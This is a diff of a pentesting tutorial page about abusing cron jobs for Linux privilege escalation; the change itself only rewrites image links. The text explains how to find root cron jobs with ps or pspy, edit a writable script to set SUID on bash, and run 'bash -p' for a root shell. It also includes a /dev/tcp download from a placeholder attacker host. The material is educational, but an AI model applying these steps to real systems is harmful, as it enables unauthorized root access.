@@ -12,33 +12,33 @@ To reduce the chances of an attacker exploiting cron jobs on a system, it is rec
 - **Configure cron job logging**: It is recommended to enable logging for cron jobs to identify any suspicious activity in the defined tasks and to maintain a record of the activities performed by each of these tasks.
 
 Let's assume we are listing directories on a compromised machine and suddenly come across a script. When we run `ls -l`, we see that it has root permissions:
-![[Pasted image 20260213203055.png]]
+![Pasted image 20260213203055](/VaultSite/wiki-images/Pasted%20image%2020260213203055.png)
 Upon examining it, we see that it is a bash script that tells you who you are and saves the output to a specific path:
-![[Pasted image 20260213203130.png]]
+![Pasted image 20260213203130](/VaultSite/wiki-images/Pasted%20image%2020260213203130.png)
 We notice that it takes a moment, but suddenly the output appears:
-![[Pasted image 20260213203215.png]]
-![[Pasted image 20260213203228.png]]
+![Pasted image 20260213203215](/VaultSite/wiki-images/Pasted%20image%2020260213203215.png)
+![Pasted image 20260213203228](/VaultSite/wiki-images/Pasted%20image%2020260213203228.png)
 
 This is the initial way to view the script without having to search for it.
 
 Let's assume we are in a completely different writable directory than where the script is located. With `ps -eo user,command`, we could see the commands currently being executed on the system:
-![[Pasted image 20260213203512.png]]
+![Pasted image 20260213203512](/VaultSite/wiki-images/Pasted%20image%2020260213203512.png)
 We could create a bash script to continuously run this command, allowing us to see all commands in real-time:
-![[Pasted image 20260213203613.png]]
+![Pasted image 20260213203613](/VaultSite/wiki-images/Pasted%20image%2020260213203613.png)
 Here we see that root has executed a scheduled cron job, and just below, we see what was executed:
-![[Pasted image 20260213203806.png]]
+![Pasted image 20260213203806](/VaultSite/wiki-images/Pasted%20image%2020260213203806.png)
 We navigate to the path and see that the script is editable due to its permissions:
-![[Pasted image 20260213203844.png]]
+![Pasted image 20260213203844](/VaultSite/wiki-images/Pasted%20image%2020260213203844.png)
 So, if we edit it and grant SUID privileges to bash:
-![[Pasted image 20260213204007.png]]
+![Pasted image 20260213204007](/VaultSite/wiki-images/Pasted%20image%2020260213204007.png)
 Now, when the scheduled task runs, we will see the permissions on bash change:
-![[Pasted image 20260213204057.png]]
-![[Pasted image 20260213204106.png]]
+![Pasted image 20260213204057](/VaultSite/wiki-images/Pasted%20image%2020260213204057.png)
+![Pasted image 20260213204106](/VaultSite/wiki-images/Pasted%20image%2020260213204106.png)
 Now, simply by running `bash -p`, we open a shell with root privileges:
-![[Pasted image 20260213204147.png]]
+![Pasted image 20260213204147](/VaultSite/wiki-images/Pasted%20image%2020260213204147.png)
 
 Another simpler method would be to use [pspy](https://github.com/DominicBreuker/pspy). We download it on our attacking machine and transfer it using `curl` or `wget`. If neither is available, we could simply set up a listener with `nc` to share the pspy file and use `cat < /dev/tcp/attacker_ip/port > pspy`:
-![[Pasted image 20260213204550.png]]
+![Pasted image 20260213204550](/VaultSite/wiki-images/Pasted%20image%2020260213204550.png)
 We then give execution permissions to pspy:
-![[Pasted image 20260213204628.png]]
-![[Pasted image 20260213204636.png]]
+![Pasted image 20260213204628](/VaultSite/wiki-images/Pasted%20image%2020260213204628.png)
+![Pasted image 20260213204636](/VaultSite/wiki-images/Pasted%20image%2020260213204636.png)
